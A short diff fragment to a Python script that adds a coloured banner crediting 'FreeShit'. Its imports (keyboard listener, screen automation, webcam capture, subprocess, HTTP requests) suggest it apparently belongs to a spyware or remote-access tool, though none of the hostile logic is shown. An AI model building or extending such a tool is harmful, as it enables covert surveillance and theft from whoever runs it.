@@ -2,15 +2,32 @@ import pyautogui
 import requests
 import threading
 import os
+import colorama
 import datetime
 import cv2
 from io import BytesIO
 from PIL import Image
 from os import system
+from colorama import Fore,init
 from subprocess import Popen, PIPE 
 from time import sleep
 from pynput.keyboard import Key, Listener
 import os
+
+init()
+
+banner = f"""
+{colorama.Fore.RED}███████╗██████╗ ███████╗███████╗███████╗██╗  ██╗██╗████████╗
+{colorama.Fore.GREEN}██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝██║  ██║██║╚══██╔══╝  
+{colorama.Fore.RED}█████╗  ██████╔╝█████╗  █████╗  ███████╗███████║██║   ██║      
+{colorama.Fore.GREEN}██╔══╝  ██╔══██╗██╔══╝  ██╔══╝  ╚════██║██╔══██║██║   ██║    
+{colorama.Fore.RED}██║     ██║  ██║███████╗███████╗███████║██║  ██║██║   ██║     
+{colorama.Fore.GREEN}╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝ 
+{colorama.Fore.RED}Created By FreeShit ║ Dev: segations#2344 ║ getfreeshit.today
+{colorama.Fore.GREEN}                      Version 2.0.0
+"""
+print(banner)
+
 
 strthost = {
     "bytes":requests.get("").content,
